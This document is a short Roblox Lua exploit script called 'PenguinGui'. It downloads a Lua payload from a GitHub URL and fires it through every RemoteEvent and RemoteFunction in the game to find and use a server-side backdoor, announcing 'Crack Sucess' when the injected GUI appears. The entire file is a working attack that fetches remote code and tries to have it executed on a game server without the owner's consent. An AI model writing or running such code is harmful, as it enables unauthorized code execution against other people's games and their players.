local des = game:GetDescendants()
local comand = game:HttpGet("https://raw.githubusercontent.com/gleb2803/Punguin-Gui/refs/heads/main/scr/Main.lua")
comand = string.gsub(comand,"/localplayer/",game.Players.LocalPlayer.Name)

function notify(text)
    game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "PenguinGui",
	Text = text, 
	Icon = "rbxassetid://104745398169988"
})
end

function testRE(re)
    re:FireServer(comand)
    wait(3)
    if game.CoreGui:FindFirstChild("PenguinGui") then
        return true
    else
        return false
    end
end

function testRF(rf)
    rf:InvokeServer(comand)
    wait(3)
    if game.CoreGui:FindFirstChild("PenguinGui") then
        return true
    else
        return false
    end
end

function main()
    for i,v in pairs(des) do
        if v:IsA("RemoteEvent") then
            if testRE(v) then
                notify("Crack Sucess")
                break
            end
        elseif v:IsA("RemoteFunction") then
            if testRF(v) then
                notify("Crack Sucess")
                break
            end
        end
    end

    if game.CoreGui:FindFirstChild("PenguinGui") == nil then
    	notify("BackDoor Not Found")
    end
end

local success = pcall(main)

print(success)
